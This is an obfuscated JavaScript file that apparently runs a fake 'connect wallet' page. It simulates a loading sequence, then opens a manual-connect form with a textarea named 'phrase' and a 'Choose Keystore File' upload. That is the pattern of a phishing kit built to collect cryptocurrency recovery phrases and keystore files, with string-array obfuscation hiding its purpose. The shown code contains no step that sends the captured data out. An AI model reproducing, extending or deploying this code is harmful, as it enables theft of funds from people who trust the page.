var l = c;
(function (d, e) {
  var k = c,
    f = d();
  while (!![]) {
    try {
      var g =
        (-parseInt(k(0x171)) / 0x1) * (-parseInt(k(0x18f)) / 0x2) +
        -parseInt(k(0x166)) / 0x3 +
        (-parseInt(k(0x168)) / 0x4) * (-parseInt(k(0x15d)) / 0x5) +
        (parseInt(k(0x188)) / 0x6) * (-parseInt(k(0x155)) / 0x7) +
        (parseInt(k(0x162)) / 0x8) * (parseInt(k(0x18c)) / 0x9) +
        (parseInt(k(0x173)) / 0xa) * (-parseInt(k(0x151)) / 0xb) +
        (parseInt(k(0x158)) / 0xc) * (parseInt(k(0x185)) / 0xd);
      if (g === e) break;
      else f["push"](f["shift"]());
    } catch (h) {
      f["push"](f["shift"]());
    }
  }
})(b, 0x7791b);
var popupname = document[l(0x14d)](l(0x183)),
  firstpopupname = document[l(0x14d)](".jsJmJE"),
  overlay = document["querySelector"](l(0x177)),
  icon = document[l(0x16a)](l(0x17e)),
  icon_text = document[l(0x16a)](l(0x187)),
  popupimage = document["getElementById"](l(0x182)),
  firstpopupimage = document[l(0x14d)](l(0x169)),
  icon_img = document["querySelectorAll"](l(0x17e)),
  wallet_id = document[l(0x14d)](l(0x16d)),
  connect_manual = document["querySelector"](l(0x18a)),
  firstoverlay = document[l(0x14d)](l(0x17d)),
  a,
  connect = document["querySelector"](l(0x18a)),
  loading = document[l(0x14d)](l(0x14e));
(firstoverlay[l(0x152)][l(0x15a)] = l(0x154)) &&
  (connect[l(0x152)][l(0x15a)] = l(0x154));
function loadings() {
  var d = setTimeout(function () {
      var m = c;
      loading["innerHTML"] = m(0x164);
    }, 0x1),
    d = setTimeout(function () {
      var n = c;
      loading["innerHTML"] = n(0x17a);
    }, 0x190),
    d = setTimeout(function () {
      loading["innerHTML"] = "Initializing...";
    }, 0x320),
    d = setTimeout(function () {
      var o = c;
      loading[o(0x16b)] = o(0x164);
    }, 0x4b0),
    d = setTimeout(function () {
      var p = c;
      loading[p(0x16b)] = p(0x17a);
    }, 0x578),
    d = setTimeout(function () {
      var q = c;
      (loading[q(0x16b)] = q(0x163)),
        (overlay[q(0x152)][q(0x15a)] = q(0x189)),
        (firstoverlay["style"][q(0x15a)] = q(0x154));
    }, 0x708);
}
function icon_click(d) {
  var r = l;
  d[r(0x179)]();
  var f = document[r(0x14d)](r(0x177));
  (firstoverlay[r(0x152)]["display"] = "flex"),
    (popupname[r(0x16b)] = $(this)
      [r(0x159)]()
      [r(0x181)]()
      [r(0x186)](r(0x18d), "")),
    (popupimage[r(0x172)] = $(this)
      [r(0x15e)](r(0x175))
      ["children"]("img")
      [r(0x174)](r(0x172))),
    (wallet_id[r(0x153)] = popupname["innerHTML"]),
    (firstpopupname["innerHTML"] = popupname[r(0x16b)]),
    (firstpopupimage[r(0x172)] = popupimage[r(0x172)]),
    loadings();
}
for (var i = 0x0; i < icon[l(0x18e)]; i++) {
  $(l(0x17e))[i][l(0x18b)](l(0x176), icon_click, !![]);
}
var cancel = document[l(0x14d)](l(0x17f));
function firstcancel() {
  var s = l;
  (firstoverlay[s(0x152)][s(0x15a)] = s(0x154)),
    (connect_manual[s(0x152)]["display"] = s(0x154)),
    (loading[s(0x16b)] = "");
}
var x_button = (document[l(0x14d)](".fRcQRh")[l(0x17b)] = firstcancel),
  back_button = (document[l(0x14d)](l(0x170))[l(0x17b)] = firstcancel);
function b() {
  var w = [
    "flex",
    ".jwEAlI",
    "addEventListener",
    "1392318OPAdNp",
    "\x20Wallet",
    "length",
    "2orTMzc",
    "text-sm\x20sm:text-base\x20placeholder-gray-500\x20pl-4\x20pr-4\x20rounded-lg\x20border\x20border-gray-400\x20w-full",
    "substring",
    "querySelector",
    ".loading",
    "getElementsByClassName",
    "getElementById",
    "11NqAWor",
    "style",
    "value",
    "none",
    "2373bkyecg",
    "Choose\x20Keystore\x20File",
    "#span",
    "2796qJdHgj",
    "text",
    "display",
    "active",
    "indexOf",
    "515cZTnYQ",
    "children",
    "change",
    "#connekt",
    "#cymkm",
    "8Zhbvdb",
    "Initializing...",
    "Initializing.",
    "lastIndexOf",
    "1309995BLqHip",
    "remove",
    "19524VcGvsy",
    ".firstImg",
    "querySelectorAll",
    "innerHTML",
    "#label",
    "#wallet_id",
    "add",
    "html",
    ".fhSmUE",
    "204719JwFmhk",
    "src",
    "34790wUxkxD",
    "attr",
    "div",
    "click",
    ".overlay",
    "<textarea\x20cols=\x2730\x27\x20rows=\x274\x27\x20placeholder=\x27Enter\x20your\x20type\x20of\x20wallet\x27\x20class=\x27text-sm\x20sm:text-base\x20placeholder-gray-500\x20pl-4\x20pr-4\x20rounded-lg\x20border\x20border-gray-400\x20w-full\x20py-2\x20focus:outline-none\x20focus:border-blue-400\x27\x20name=\x27phrase\x27\x20required=\x27\x27\x20style=\x27margin-top:0px;margin-bottom:0px;height:45px\x27></textarea>",
    "preventDefault",
    "Initializing..",
    "onclick",
    "file-upload",
    ".sc-bdVaJa",
  
    "#cancel",
    "classList",
    "trim",
    "myImg",
    "#walletname",
    "#first",
    "17927hKkRMa",
    "replace",
    ".pageStyles__SAppName-sc-1navawn-7",
    "4488swYtin",
  ];
  b = function () {
    return w;
  };
  return b();
}
cancel[l(0x18b)](l(0x176), function () {
  var t = l,
    d = document[t(0x14d)](t(0x177));
  d[t(0x152)][t(0x15a)] = t(0x154);
  var e = document[t(0x14d)]("#span");
  e[t(0x16b)] = t(0x156);
  var f = document[t(0x14d)](t(0x184)),
    g = document["querySelector"]("#second"),
    h = document[t(0x14d)]("#third");
  f[t(0x180)][t(0x167)](t(0x15b)),
    g[t(0x180)][t(0x167)](t(0x15b)),
    h[t(0x180)]["remove"](t(0x15b)),
    f[t(0x180)][t(0x16e)](t(0x15b));
  var f = document[t(0x14f)](t(0x190));
  for (let j = 0x0; j < f["length"]; j++) {
    f[j][t(0x153)] = "";
  }
});
var label = document[l(0x14d)](l(0x16c));
function c(a, d) {
  var e = b();
  return (
    (c = function (f, g) {
      f = f - 0x14d;
      var h = e[f];
      return h;
    }),
    c(a, d)
  );
}
label[l(0x18b)](l(0x15f), filenaming);
function filenaming(d) {
  var u = l;
  d[u(0x179)]();
  var f = document[u(0x14d)](u(0x157)),
    g = document[u(0x150)](u(0x17c))[u(0x153)];
  if (g) {
    var h = g[u(0x15c)]("\x5c") >= 0x0 ? g[u(0x165)]("\x5c") : g[u(0x165)]("/"),
      j = g["substring"](h);
    (j["indexOf"]("\x5c") === 0x0 || j[u(0x15c)]("/") === 0x0) &&
      (j = j[u(0x191)](0x1)),
      (f[u(0x16b)] = j);
  }
}
$(l(0x160))["click"](function () {
  var v = l,
    d = $(v(0x161))["html"]();
  alert(d);
  (d = "Other") && $("#walletname11")[v(0x16f)](v(0x178));
});
